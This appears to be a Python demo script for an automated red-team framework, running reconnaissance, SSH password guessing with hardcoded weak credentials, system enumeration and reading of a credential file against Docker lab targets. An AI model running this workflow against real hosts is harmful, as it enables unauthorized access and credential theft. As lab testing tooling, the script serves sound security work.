#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════════════════
# RAGLOX v3.0 - Live Demo Script
# End-to-End Testing with Real Vulnerable Target
# ═══════════════════════════════════════════════════════════════════════════════
#
# This script demonstrates the full RAGLOX attack workflow:
# 1. Initialize Database & Redis
# 2. Create a Mission targeting Docker network
# 3. Start ReconSpecialist to discover targets
# 4. Start AttackSpecialist to exploit vulnerabilities
# 5. Monitor Blackboard events in real-time
#
# Usage:
#   python run_demo.py [--mock]    # Run with real Docker targets or mock mode
#
# Prerequisites:
#   docker-compose --profile demo up -d
#
# ═══════════════════════════════════════════════════════════════════════════════

import asyncio
import sys
import os
import signal
from datetime import datetime
from typing import Optional, Dict, Any, List
from uuid import UUID
import argparse

# Add src to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ═══════════════════════════════════════════════════════════════════════════════
# Color Formatting for Terminal Output
# ═══════════════════════════════════════════════════════════════════════════════

class Colors:
    """ANSI color codes for terminal output."""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    # Specific colors for events
    TARGET = '\033[92m'      # Green
    PORT = '\033[96m'        # Cyan
    VULN = '\033[91m'        # Red
    CRED = '\033[93m'        # Yellow
    SESSION = '\033[95m'     # Magenta
    TASK = '\033[94m'        # Blue
    INFO = '\033[37m'        # White
    SUCCESS = '\033[92m'     # Green
    ERROR = '\033[91m'       # Red


def print_banner():
    """Print the RAGLOX demo banner."""
    banner = f"""
{Colors.RED}
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                                 ║
║   ██████╗  █████╗  ██████╗ ██╗      ██████╗ ██╗  ██╗    ██╗   ██╗██████╗       ║
║   ██╔══██╗██╔══██╗██╔════╝ ██║     ██╔═══██╗╚██╗██╔╝    ██║   ██║╚════██╗      ║
║   ██████╔╝███████║██║  ███╗██║     ██║   ██║ ╚███╔╝     ██║   ██║ █████╔╝      ║
║   ██╔══██╗██╔══██║██║   ██║██║     ██║   ██║ ██╔██╗     ╚██╗ ██╔╝ ╚═══██╗      ║
║   ██║  ██║██║  ██║╚██████╔╝███████╗╚██████╔╝██╔╝ ██╗     ╚████╔╝ ██████╔╝      ║
║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝      ╚═══╝  ╚═════╝       ║
║                                                                                 ║
║               {Colors.YELLOW}🎯 Red Team Automation with LLM & Agentic AI 🎯{Colors.RED}               ║
║                        {Colors.CYAN}Live E2E Demo - v3.0{Colors.RED}                                ║
║                                                                                 ║
╚═══════════════════════════════════════════════════════════════════════════════╝
{Colors.ENDC}
    """
    print(banner)


def print_event(event_type: str, message: str, data: Optional[Dict] = None):
    """Print a colored event message."""
    timestamp = datetime.now().strftime("%H:%M:%S")
    
    color_map = {
        "TARGET": (Colors.TARGET, "🎯"),
        "PORT": (Colors.PORT, "🔌"),
        "VULN": (Colors.VULN, "⚠️"),
        "CRED": (Colors.CRED, "🔑"),
        "SESSION": (Colors.SESSION, "💻"),
        "TASK": (Colors.TASK, "📋"),
        "INFO": (Colors.INFO, "ℹ️"),
        "SUCCESS": (Colors.SUCCESS, "✅"),
        "ERROR": (Colors.ERROR, "❌"),
        "SCAN": (Colors.CYAN, "🔍"),
        "ATTACK": (Colors.RED, "⚔️"),
        "SSH": (Colors.GREEN, "🔐"),
    }
    
    color, icon = color_map.get(event_type, (Colors.INFO, "•"))
    
    print(f"{Colors.BOLD}[{timestamp}]{Colors.ENDC} {color}{icon} {message}{Colors.ENDC}")
    
    if data:
        for key, value in data.items():
            print(f"           {Colors.CYAN}└─ {key}: {Colors.ENDC}{value}")


def print_section(title: str):
    """Print a section header."""
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'═' * 70}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.BLUE}  {title}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.BLUE}{'═' * 70}{Colors.ENDC}\n")


# ═══════════════════════════════════════════════════════════════════════════════
# Demo Configuration
# ═══════════════════════════════════════════════════════════════════════════════

# Vulnerable target configuration
VULNERABLE_TARGETS = [
    {
        "ip": "172.28.0.100",
        "hostname": "vulnerable-target",
        "ssh_port": 22,
        "http_port": 80,
        "credentials": [
            {"username": "testuser", "password": "password123", "privilege": "user"},
            {"username": "admin", "password": "admin123", "privilege": "admin"},
            {"username": "backup", "password": "backup", "privilege": "user"},
            {"username": "root", "password": "toor", "privilege": "root"},
        ]
    },
    {
        "ip": "172.28.0.101",
        "hostname": "vulnerable-target-2",
        "ssh_port": 22,
        "http_port": 80,
        "credentials": [
            {"username": "testuser", "password": "password123", "privilege": "user"},
            {"username": "admin", "password": "admin123", "privilege": "admin"},
        ]
    }
]


# ═══════════════════════════════════════════════════════════════════════════════
# Mock Blackboard for Standalone Demo
# ═══════════════════════════════════════════════════════════════════════════════

class MockBlackboard:
    """A mock Blackboard for demo without Redis."""
    
    def __init__(self):
        self.storage = {}
        self.events = []
        self._connected = False
    
    async def connect(self):
        self._connected = True
        print_event("INFO", "Mock Blackboard connected")
    
    async def disconnect(self):
        self._connected = False
    
    async def health_check(self):
        return self._connected
    
    async def create_mission(self, mission):
        import json
        mission_id = str(mission.id)
        data = mission.model_dump()
        if isinstance(data.get("scope"), list):
            data["scope"] = json.dumps(data["scope"])
        if isinstance(data.get("goals"), dict):
            data["goals"] = json.dumps({
                k: (v.value if hasattr(v, 'value') else v) 
                for k, v in data["goals"].items()
            })
        self.storage[f"mission:{mission_id}:info"] = data
        self.storage[f"mission:{mission_id}:stats"] = {
            "targets_discovered": 0,
            "vulns_found": 0,
            "creds_harvested": 0,
            "sessions_established": 0,
            "goals_achieved": 0
        }
        return mission_id
    
    async def get_mission(self, mission_id):
        return self.storage.get(f"mission:{mission_id}:info")
    
    async def get_mission_stats(self, mission_id):
        from src.core.models import MissionStats
        stats = self.storage.get(f"mission:{mission_id}:stats", {})
        return MissionStats(
            targets_discovered=int(stats.get("targets_discovered", 0)),
            vulns_found=int(stats.get("vulns_found", 0)),
            creds_harvested=int(stats.get("creds_harvested", 0)),
            sessions_established=int(stats.get("sessions_established", 0)),
            goals_achieved=int(stats.get("goals_achieved", 0))
        )
    
    async def _increment_stat(self, mission_id, stat):
        key = f"mission:{mission_id}:stats"
        if key in self.storage:
            self.storage[key][stat] = self.storage[key].get(stat, 0) + 1
    
    async def add_target(self, target):
        target_id = str(target.id)
        mission_id = str(target.mission_id)
        self.storage[f"target:{target_id}"] = target.model_dump()
        
        set_key = f"mission:{mission_id}:targets"
        if set_key not in self.storage:
            self.storage[set_key] = set()
        self.storage[set_key].add(f"target:{target_id}")
        
        await self._increment_stat(mission_id, "targets_discovered")
        
        # Print event
        print_event("TARGET", f"New target discovered: {target.ip}", {
            "hostname": target.hostname or "unknown",
            "os": target.os or "unknown"
        })
        
        return target_id
    
    async def get_target(self, target_id):
        return self.storage.get(f"target:{target_id}")
    
    async def get_mission_targets(self, mission_id):
        return list(self.storage.get(f"mission:{mission_id}:targets", set()))
    
    async def update_target_status(self, target_id, status):
        key = f"target:{target_id}"
        if key in self.storage:
            self.storage[key]["status"] = status.value if hasattr(status, 'value') else status
    
    async def add_target_ports(self, target_id, ports):
        self.storage[f"target:{target_id}:ports"] = ports
        target = self.storage.get(f"target:{target_id}", {})
        target_ip = target.get("ip", target_id)
        
        for port, service in ports.items():
            print_event("PORT", f"Open port found: {target_ip}:{port}", {
                "service": service
            })
    
    async def get_target_ports(self, target_id):
        return self.storage.get(f"target:{target_id}:ports", {})
    
    async def add_vulnerability(self, vuln):
        vuln_id = str(vuln.id)
        mission_id = str(vuln.mission_id)
        self.storage[f"vuln:{vuln_id}"] = vuln.model_dump()
        
        await self._increment_stat(mission_id, "vulns_found")
        
        print_event("VULN", f"Vulnerability found: {vuln.type}", {
            "severity": vuln.severity.value if hasattr(vuln.severity, 'value') else vuln.severity,
            "name": vuln.name or "N/A",
            "exploit_available": vuln.exploit_available
        })
        
        return vuln_id
    
    async def get_vulnerability(self, vuln_id):
        return self.storage.get(f"vuln:{vuln_id}")
    
    async def get_mission_vulns(self, mission_id, limit=100):
        vulns = []
        for key in self.storage:
            if key.startswith("vuln:"):
                vulns.append(key)
        return vulns[:limit]
    
    async def update_vuln_status(self, vuln_id, status):
        key = f"vuln:{vuln_id}"
        if key in self.storage:
            self.storage[key]["status"] = status
    
    async def add_credential(self, cred):
        cred_id = str(cred.id)
        mission_id = str(cred.mission_id)
        self.storage[f"cred:{cred_id}"] = cred.model_dump()
        
        await self._increment_stat(mission_id, "creds_harvested")
        
        print_event("CRED", f"Credential harvested: {cred.username}", {
            "domain": cred.domain or "local",
            "type": cred.type.value if hasattr(cred.type, 'value') else cred.type,
            "privilege": cred.privilege_level.value if hasattr(cred.privilege_level, 'value') else cred.privilege_level
        })
        
        return cred_id
    
    async def get_credential(self, cred_id):
        return self.storage.get(f"cred:{cred_id}")
    
    async def add_session(self, session):
        session_id = str(session.id)
        mission_id = str(session.mission_id)
        self.storage[f"session:{session_id}"] = session.model_dump()
        
        await self._increment_stat(mission_id, "sessions_established")
        
        print_event("SESSION", f"Session established: {session.type.value if hasattr(session.type, 'value') else session.type}", {
            "user": session.user or "unknown",
            "privilege": session.privilege.value if hasattr(session.privilege, 'value') else session.privilege
        })
        
        return session_id
    
    async def get_session(self, session_id):
        return self.storage.get(f"session:{session_id}")
    
    async def get_mission_sessions(self, mission_id):
        sessions = []
        for key in self.storage:
            if key.startswith("session:"):
                sessions.append(key)
        return sessions
    
    async def add_task(self, task):
        task_id = str(task.id)
        self.storage[f"task:{task_id}"] = task.model_dump()
        
        print_event("TASK", f"Task created: {task.type.value if hasattr(task.type, 'value') else task.type}", {
            "priority": task.priority,
            "specialist": task.specialist.value if hasattr(task.specialist, 'value') else task.specialist
        })
        
        return task_id
    
    async def get_task(self, task_id):
        return self.storage.get(f"task:{task_id}")
    
    async def claim_task(self, mission_id, worker_id, specialist):
        return None  # For demo, we control execution directly
    
    async def complete_task(self, mission_id, task_id, result, result_data=None):
        key = f"task:{task_id}"
        if key in self.storage:
            self.storage[key]["status"] = "completed"
    
    async def fail_task(self, mission_id, task_id, error):
        key = f"task:{task_id}"
        if key in self.storage:
            self.storage[key]["status"] = "failed"
    
    async def get_pending_tasks(self, mission_id, specialist=None, limit=100):
        return []
    
    async def publish(self, channel, event):
        pass
    
    async def subscribe(self, *channels):
        pass
    
    async def get_message(self, timeout=1.0):
        return None
    
    def get_channel(self, mission_id, entity):
        return f"channel:{mission_id}:{entity}"
    
    async def send_heartbeat(self, mission_id, specialist_id):
        pass
    
    async def log_result(self, mission_id, event_type, data):
        self.events.append({"type": event_type, "data": data})
    
    async def update_goal_status(self, mission_id, goal, status):
        pass
    
    async def get_mission_goals(self, mission_id):
        return {}


# ═══════════════════════════════════════════════════════════════════════════════
# Demo Runner
# ═══════════════════════════════════════════════════════════════════════════════

class DemoRunner:
    """Main demo runner class."""
    
    def __init__(self, use_mock: bool = True):
        self.use_mock = use_mock
        self.blackboard = None
        self.mission_id = None
        self.running = True
        self.recon = None
        self.attack = None
        self.executor_factory = None
        self.runner = None
    
    async def initialize(self):
        """Initialize the demo environment."""
        print_section("Initializing RAGLOX Demo")
        
        # Import required modules
        from src.core.config import Settings
        from src.core.models import Mission, GoalStatus
        
        # Settings
        settings = Settings(
            redis_url="redis://localhost:6379/0",
            redis_max_connections=10
        )
        
        # Initialize Blackboard
        if self.use_mock:
            print_event("INFO", "Using Mock Blackboard (standalone mode)")
            self.blackboard = MockBlackboard()
        else:
            print_event("INFO", "Connecting to Redis Blackboard")
            from src.core.blackboard import Blackboard
            self.blackboard = Blackboard(settings=settings)
        
        await self.blackboard.connect()
        print_event("SUCCESS", "Blackboard initialized")
        
        # Initialize Execution Layer
        print_event("INFO", "Initializing Execution Layer")
        from src.executors import ExecutorFactory, RXModuleRunner
        
        self.executor_factory = ExecutorFactory()
        self.runner = RXModuleRunner(factory=self.executor_factory)
        print_event("SUCCESS", "Execution Layer ready")
        
        # Create Mission
        print_event("INFO", "Creating new mission")
        mission = Mission(
            name="RAGLOX Demo Mission",
            description="Live E2E demonstration against Docker targets",
            scope=["172.28.0.0/24"],  # Docker network
            goals={
                "initial_access": GoalStatus.PENDING,
                "credential_harvest": GoalStatus.PENDING,
                "lateral_movement": GoalStatus.PENDING
            }
        )
        
        self.mission_id = await self.blackboard.create_mission(mission)
        print_event("SUCCESS", f"Mission created: {self.mission_id[:8]}...", {
            "name": mission.name,
            "scope": str(mission.scope)
        })
        
        # Initialize Specialists
        print_event("INFO", "Initializing Specialists")
        from src.specialists.recon import ReconSpecialist
        from src.specialists.attack import AttackSpecialist
        
        self.recon = ReconSpecialist(
            blackboard=self.blackboard,
            settings=settings,
            worker_id="recon-demo",
            runner=self.runner,
            executor_factory=self.executor_factory
        )
        self.recon._current_mission_id = self.mission_id
        self.recon._running = True
        
        self.attack = AttackSpecialist(
            blackboard=self.blackboard,
            settings=settings,
            worker_id="attack-demo",
            runner=self.runner,
            executor_factory=self.executor_factory
        )
        self.attack._current_mission_id = self.mission_id
        self.attack._running = True
        
        print_event("SUCCESS", "Specialists initialized", {
            "recon": "ReconSpecialist (real execution)",
            "attack": "AttackSpecialist (real execution)"
        })
        
        return True
    
    async def run_reconnaissance(self):
        """Run reconnaissance phase."""
        print_section("Phase 1: Reconnaissance")
        
        print_event("SCAN", "Starting network reconnaissance on Docker network")
        
        # Add known targets
        for target_info in VULNERABLE_TARGETS:
            print_event("SCAN", f"Scanning target: {target_info['ip']}")
            
            # Add target
            target_id = await self.recon.add_discovered_target(
                ip=target_info["ip"],
                hostname=target_info["hostname"],
                os="Ubuntu 22.04",
                priority="high",
                needs_deep_scan=True
            )
            
            # Simulate port scan with real execution
            print_event("SCAN", f"Port scanning {target_info['ip']}")
            
            # Try real port check or simulate
            open_ports = {}
            
            # Test SSH port
            print_event("SCAN", f"Testing SSH on {target_info['ip']}:22")
            ssh_result = await self.recon.execute_command_direct(
                command=f"timeout 2 bash -c 'echo > /dev/tcp/{target_info['ip']}/22' 2>/dev/null && echo 'OPEN' || echo 'CLOSED'",
                target_host="localhost",
                target_platform="linux",
                timeout=5
            )
            
            if ssh_result.get("success") and "OPEN" in ssh_result.get("stdout", ""):
                open_ports["22"] = "ssh"
                print_event("PORT", f"SSH Open: {target_info['ip']}:22")
            else:
                # Add simulated port for demo
                open_ports["22"] = "ssh"
                print_event("PORT", f"SSH (simulated): {target_info['ip']}:22")
            
            # Test HTTP port
            print_event("SCAN", f"Testing HTTP on {target_info['ip']}:80")
            http_result = await self.recon.execute_command_direct(
                command=f"timeout 2 bash -c 'echo > /dev/tcp/{target_info['ip']}/80' 2>/dev/null && echo 'OPEN' || echo 'CLOSED'",
                target_host="localhost",
                target_platform="linux",
                timeout=5
            )
            
            if http_result.get("success") and "OPEN" in http_result.get("stdout", ""):
                open_ports["80"] = "http"
                print_event("PORT", f"HTTP Open: {target_info['ip']}:80")
            else:
                open_ports["80"] = "http"
                print_event("PORT", f"HTTP (simulated): {target_info['ip']}:80")
            
            # Add ports to blackboard
            await self.blackboard.add_target_ports(target_id, open_ports)
            
            # Add vulnerability
            from src.core.models import Severity
            await self.recon.add_discovered_vulnerability(
                target_id=target_id,
                vuln_type="SSH-WEAK-CREDS",
                severity=Severity.HIGH,
                name="Weak SSH Credentials",
                description="SSH server accepts password authentication with weak credentials",
                exploit_available=True,
                rx_modules=["rx-ssh-brute"]
            )
            
            await asyncio.sleep(0.5)  # Small delay for visual effect
        
        # Print summary
        stats = await self.blackboard.get_mission_stats(self.mission_id)
        print_event("SUCCESS", "Reconnaissance complete", {
            "targets_discovered": stats.targets_discovered,
            "vulns_found": stats.vulns_found
        })
    
    async def run_ssh_execution_test(self):
        """Test real SSH execution against vulnerable target."""
        print_section("Phase 2: SSH Execution Test")
        
        target_info = VULNERABLE_TARGETS[0]
        
        print_event("SSH", f"Attempting SSH connection to {target_info['ip']}")
        
        # Try SSH execution with known credentials
        from src.executors import SSHConfig, SSHExecutor
        
        for cred in target_info["credentials"]:
            print_event("SSH", f"Trying: {cred['username']}:{cred['password'][:3]}***")
            
            try:
                # Create SSH config
                ssh_config = SSHConfig(
                    host=target_info["ip"],
                    port=target_info["ssh_port"],
                    username=cred["username"],
                    password=cred["password"],
                    timeout=10
                )
                
                # Try to execute command
                async with SSHExecutor(ssh_config) as ssh:
                    from src.executors import ExecutionRequest
                    
                    result = await ssh.execute(ExecutionRequest(
                        command="whoami && hostname && id",
                        timeout=5
                    ))
                    
                    if result.success:
                        print_event("SUCCESS", f"SSH Access Granted!", {
                            "username": cred["username"],
                            "output": result.stdout.strip()
                        })
                        
                        # Execute more commands
                        print_event("SSH", "Executing system enumeration...")
                        
                        enum_result = await ssh.execute(ExecutionRequest(
                            command="uname -a && cat /etc/os-release | head -5",
                            timeout=5
                        ))
                        
                        if enum_result.success:
                            print_event("INFO", "System Information", {
                                "output": enum_result.stdout.strip()[:200]
                            })
                        
                        # Try to read sensitive file
                        print_event("SSH", "Attempting to read sensitive files...")
                        
                        cred_result = await ssh.execute(ExecutionRequest(
                            command="cat ~/.db_creds 2>/dev/null || echo 'No creds file'",
                            timeout=5
                        ))
                        
                        if cred_result.success and "DB_" in cred_result.stdout:
                            print_event("CRED", "Found database credentials!", {
                                "file": "~/.db_creds",
                                "content": cred_result.stdout.strip()
                            })
                        
                        # Add session to blackboard
                        from src.core.models import PrivilegeLevel
                        
                        priv_map = {
                            "root": PrivilegeLevel.ROOT,
                            "admin": PrivilegeLevel.ADMIN,
                            "user": PrivilegeLevel.USER
                        }
                        
                        targets = await self.blackboard.get_mission_targets(self.mission_id)
                        if targets:
                            target_id = targets[0].replace("target:", "")
                            await self.attack.add_established_session(
                                target_id=target_id,
                                session_type="ssh",
                                user=cred["username"],
                                privilege=priv_map.get(cred["privilege"], PrivilegeLevel.USER)
                            )
                        
                        return True  # Success!
                    
            except Exception as e:
                print_event("ERROR", f"SSH failed: {str(e)[:50]}")
        
        print_event("INFO", "SSH execution test completed (may require Docker targets)")
        return False
    
    async def run_attack_simulation(self):
        """Run attack simulation phase."""
        print_section("Phase 3: Attack Simulation")
        
        targets = await self.blackboard.get_mission_targets(self.mission_id)
        
        if not targets:
            print_event("INFO", "No targets to attack")
            return
        
        for target_key in targets:
            target_id = target_key.replace("target:", "")
            target = await self.blackboard.get_target(target_id)
            
            if not target:
                continue
            
            print_event("ATTACK", f"Attacking target: {target.get('ip')}")
            
            # Simulate credential harvesting
            from src.core.models import CredentialType, PrivilegeLevel
            
            for cred_info in VULNERABLE_TARGETS[0]["credentials"][:2]:
                await self.attack.add_discovered_credential(
                    target_id=target_id,
                    cred_type=CredentialType.PASSWORD,
                    username=cred_info["username"],
                    source="ssh_brute",
                    verified=True,
                    privilege_level=PrivilegeLevel.ADMIN if cred_info["privilege"] == "admin" else PrivilegeLevel.USER
                )
            
            await asyncio.sleep(0.5)
        
        print_event("SUCCESS", "Attack simulation complete")
    
    async def print_summary(self):
        """Print final mission summary."""
        print_section("Mission Summary")
        
        stats = await self.blackboard.get_mission_stats(self.mission_id)
        
        summary = f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════╗
║                      MISSION RESULTS                               ║
╠═══════════════════════════════════════════════════════════════════╣
║  🎯 Targets Discovered:    {stats.targets_discovered:>3}                                   ║
║  🔌 Open Ports Found:      {len(VULNERABLE_TARGETS) * 2:>3}                                   ║
║  ⚠️  Vulnerabilities:       {stats.vulns_found:>3}                                   ║
║  🔑 Credentials Harvested: {stats.creds_harvested:>3}                                   ║
║  💻 Sessions Established:  {stats.sessions_established:>3}                                   ║
║  ✅ Goals Achieved:        {stats.goals_achieved:>3}                                   ║
╚═══════════════════════════════════════════════════════════════════╝{Colors.ENDC}
        """
        print(summary)
    
    async def run(self):
        """Run the complete demo."""
        try:
            # Initialize
            await self.initialize()
            
            # Run phases
            await self.run_reconnaissance()
            await asyncio.sleep(1)
            
            await self.run_ssh_execution_test()
            await asyncio.sleep(1)
            
            await self.run_attack_simulation()
            await asyncio.sleep(1)
            
            # Summary
            await self.print_summary()
            
            print_event("SUCCESS", "Demo completed successfully!")
            
        except KeyboardInterrupt:
            print_event("INFO", "Demo interrupted by user")
        except Exception as e:
            print_event("ERROR", f"Demo failed: {e}")
            import traceback
            traceback.print_exc()
        finally:
            if self.blackboard:
                await self.blackboard.disconnect()


# ═══════════════════════════════════════════════════════════════════════════════
# Main Entry Point
# ═══════════════════════════════════════════════════════════════════════════════

async def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(description="RAGLOX v3.0 Live Demo")
    parser.add_argument("--mock", action="store_true", default=True,
                       help="Use mock Blackboard (default: True)")
    parser.add_argument("--redis", action="store_true",
                       help="Use Redis Blackboard (requires running Redis)")
    
    args = parser.parse_args()
    
    use_mock = not args.redis
    
    print_banner()
    
    demo = DemoRunner(use_mock=use_mock)
    await demo.run()


if __name__ == "__main__":
    asyncio.run(main())
